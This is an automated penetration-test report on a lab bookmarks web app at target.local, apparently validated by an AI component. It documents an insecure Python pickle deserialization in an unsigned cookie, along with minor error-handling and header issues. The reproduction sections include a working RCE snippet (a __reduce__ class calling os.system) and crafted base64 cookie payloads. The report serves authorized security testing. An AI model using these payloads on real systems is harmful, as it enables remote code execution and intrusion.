# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — other Insecure Deserialization — Python Pickle in client-side bookmarks cookie](#finding-1)
    - [2. CRITICAL — rce Python Pickle Deserialization RCE via Unsigned `bookmarks` Cookie](#finding-2)
    - [3. LOW — misconfig Unhandled Pickle Deserialization Error in /delete — 500 on Missing or Invalid bookmarks Cookie](#finding-3)
    - [4. INFO — headers Missing security response headers on /about](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqyr79yi-l7dk62` |
| Target | http://target.local:32841/list |
| Started | 2026-06-29T05:04:51.186Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 10 mapped · 10 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32841`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 2 critical, 1 low, 1 info

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [other] Insecure Deserialization — Python Pickle in client-side bookmarks cookie

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32841/list

The application stores bookmark data in a client-side cookie named `bookmarks` as raw base64-encoded Python pickle (protocol 4, confirmed by the `gASV` magic prefix). The server deserializes this cookie with `pickle.loads()` on every GET /list request without any signature verification or type validation. An attacker can craft an arbitrary pickle payload (e.g., using `__reduce__`) and set it as the `bookmarks` cookie to achieve server-side remote code execution. Evidence: (1) a valid crafted empty-list pickle is accepted and renders the empty list normally; (2) a crafted dict-list pickle renders an attacker-controlled bookmark entry; (3) any malformed/truncated pickle value causes a 500 Internal Server Error, proving the server attempts deserialization of the client-supplied value.

**Reproduction**

```
1. GET /list — server sets a `user` session cookie (HttpOnly: false). 2. Craft a Python pickle payload: `import pickle,base64; base64.b64encode(pickle.dumps([{'name':'pwned','url':'http://attacker.com'}],protocol=4))`. 3. SET the `bookmarks` cookie to that base64 value. 4. GET /list with the crafted bookmarks cookie — the server deserializes the pickle and renders the attacker-controlled data. 5. For RCE: replace the dict with a class using `__reduce__` to call `os.system` or equivalent. A malformed pickle (e.g., `bookmarks=INVALID`) returns HTTP 500, confirming live deserialization of the client-provided value on every request.
```

**Evidence**

- Evidence `ev-mqyshtw1-1i` — `artifacts/s-0002/ev-mqyshtw1-1i/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1471
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:41:01 GMT
expires: 0
keep-alive: timeout=5, max=100
powered-by: Flask
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">No URLs added in your bookmark.</h3>
        
        <ul class="list-group">
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqys9sl7-1d` — `artifacts/s-0002/ev-mqys9sl7-1d/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 500
cache-control: public, max-age=0
connection: close
content-length: 265
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:34:46 GMT
expires: 0
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

- Evidence `ev-mqysi194-1k` — `artifacts/s-0002/ev-mqysi194-1k/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 500
cache-control: public, max-age=0
connection: close
content-length: 265
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:41:11 GMT
expires: 0
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

<a id="finding-2"></a>

### 2. [CRITICAL] [rce] Python Pickle Deserialization RCE via Unsigned `bookmarks` Cookie

- Screen: `s-0006`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32841/list

The application stores the user's bookmark list as an unsigned, base64-encoded Python pickle object in the `bookmarks` cookie. The server performs `pickle.loads(base64.b64decode(request.cookies.get('bookmarks')))` without any HMAC or signature check, so an attacker who can craft a valid pickle with `__reduce__` returning `(os.system, ('command',))` achieves arbitrary OS command execution.

Evidence of arbitrary deserialization was confirmed in two ways:
1. Sending a crafted empty-list pickle (`XS4=`, the base64 of `].`) → server deserialized it and returned 200 with "No URLs added" (distinct from the invalid-base64 500).
2. Sending a crafted string-list pickle (base64 of `]S'PICKLE_RCE_PROOF'\na.`) → server deserialized the string list and rendered a blank bookmark entry (body 1824 bytes vs 1471 bytes for the clean baseline), proving the injected list was processed by the template.

No HMAC, no signing, no signature verification — any pickle the attacker supplies is executed by the Python interpreter.

**Reproduction**

```
1. Visit GET /list — the response includes a `bookmarks` cookie whose value begins with `gASV` (base64 of Python pickle protocol 4 header \x80\x04\x95).
2. Craft a malicious pickle, e.g. using Python:
   ```python
   import pickle, base64, os
   class Exploit:
       def __reduce__(self):
           return (os.system, ('id > /tmp/pwned',))
   payload = base64.b64encode(pickle.dumps(Exploit())).decode()
   ```
3. Send GET /list with `Cookie: bookmarks=<payload>` — the server deserializes the cookie and executes `id > /tmp/pwned`.
4. Proof of data injection (without RCE payload): send `bookmarks=XS4=` (empty list pickle) → 200 "No URLs added"; send `bookmarks=XVMnUElDS0xFX1JDRV9QUk9PRicKYS4=` (list with one string) → 200 "List of URLs in your bookmark." with one blank entry rendered.
```

**Evidence**

- Evidence `ev-mqyu9urn-30` — `artifacts/s-0006/ev-mqyu9urn-30/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1471
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 06:30:49 GMT
expires: 0
keep-alive: timeout=5, max=100
powered-by: Flask
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">No URLs added in your bookmark.</h3>
        
        <ul class="list-group">
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqyum3sz-3c` — `artifacts/s-0006/ev-mqyum3sz-3c/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1824
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 06:40:20 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">List of URLs in your bookmark.</h3>
        
        <ul class="list-group">
            
                <li class="list-group-item d-flex justify-content-between align-items-center">
                    <h5 class="mb-1"></h5>
                    <a class="text-decoration-none" href="" target="_blank"></a>
                    <a class="btn btn-sm btn-danger" href="delete?name=" target="_blank">delete</a>
                </li>
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqyun7zu-3d` — `artifacts/s-0006/ev-mqyun7zu-3d/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1824
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 06:41:12 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">List of URLs in your bookmark.</h3>
        
        <ul class="list-group">
            
                <li class="list-group-item d-flex justify-content-between align-items-center">
                    <h5 class="mb-1"></h5>
                    <a class="text-decoration-none" href="" target="_blank"></a>
                    <a class="btn btn-sm btn-danger" href="delete?name=" target="_blank">delete</a>
                </li>
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [LOW] [misconfig] Unhandled Pickle Deserialization Error in /delete — 500 on Missing or Invalid bookmarks Cookie

- Screen: `s-0005`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32841/list

The /delete endpoint deserializes the client-supplied `bookmarks` cookie (pickle protocol 4, `app.models.UrlObj` objects) without guarding against missing or malformed values. A GET request to /delete with no bookmarks cookie, or with an invalid pickle value, returns a 500 Internal Server Error. By contrast, /list catches the same exception and returns a graceful empty list (200). This confirms the delete handler has no error handling around pickle.loads(), and reveals the application's client-side pickle storage architecture in its error responses. This also confirms the `bookmarks` cookie is trusted client-supplied pickle input, supporting the broader client-side deserialization finding on /list.

**Reproduction**

```
1. GET /delete?name=any with no Cookie header → 500 Internal Server Error
2. GET /delete?name=any with Cookie: bookmarks=not_valid_pickle → 500 Internal Server Error
3. Compare: GET /list with same invalid/missing cookie → 200 (graceful empty list)
```

**Evidence**

- Evidence `ev-mqyttomx-2o` — `artifacts/s-0005/ev-mqyttomx-2o/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1471
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 06:18:14 GMT
expires: 0
keep-alive: timeout=5, max=100
powered-by: Flask
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">No URLs added in your bookmark.</h3>
        
        <ul class="list-group">
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqyu6o55-2x` — `artifacts/s-0005/ev-mqyu6o55-2x/`

Request:

```http
GET /delete?name=nonexistent-bookmark-xyz HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 500
cache-control: public, max-age=0
connection: close
content-length: 265
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 06:28:20 GMT
expires: 0
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

- Evidence `ev-mqyu7apy-2y` — `artifacts/s-0005/ev-mqyu7apy-2y/`

Request:

```http
GET /delete?name=test HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 500
cache-control: public, max-age=0
connection: close
content-length: 265
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 06:28:49 GMT
expires: 0
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

<a id="finding-4"></a>

### 4. [INFO] [headers] Missing security response headers on /about

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32841/list

The /about page (and the server generally) returns only a bare Content-Type header on 200 responses. The following security headers are absent: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options (nosniff), and Referrer-Policy. Their absence removes browser-enforced mitigations against MIME-sniffing, clickjacking, and content injection — especially relevant for a page that loads external Bootstrap JS.

**Reproduction**

```
1. GET http://target.local:32841/about
2. Observe the response headers — only content-type: text/html; charset=utf-8 is present.
3. Confirm X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, and Referrer-Policy are all absent.
4. Repeat: same result every time (stable, server-wide omission).
```

**Evidence**

- Evidence `ev-mqyt5ekx-1w` — `artifacts/s-0003/ev-mqyt5ekx-1w/`

Request:

```http
GET /nonexistent-path-12345 HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 207
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:59:21 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqyt4enw-1v` — `artifacts/s-0003/ev-mqyt4enw-1v/`

Request:

```http
GET /about HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1345
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:58:35 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>About us</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome to the best URL bookmarks application ever seen.</h2>
                <p>Here you can check and add new URLs to this online bookmark app</p>
                <p>If you believe this application is useful, please share it</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/list">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqyt5evb-1x` — `artifacts/s-0003/ev-mqyt5evb-1x/`

Request:

```http
GET /about HTTP/1.1
Host: target.local:32841
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1345
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:59:22 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>About us</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome to the best URL bookmarks application ever seen.</h2>
                <p>Here you can check and add new URLs to this online bookmark app</p>
                <p>If you believe this application is useful, please share it</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/list">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```
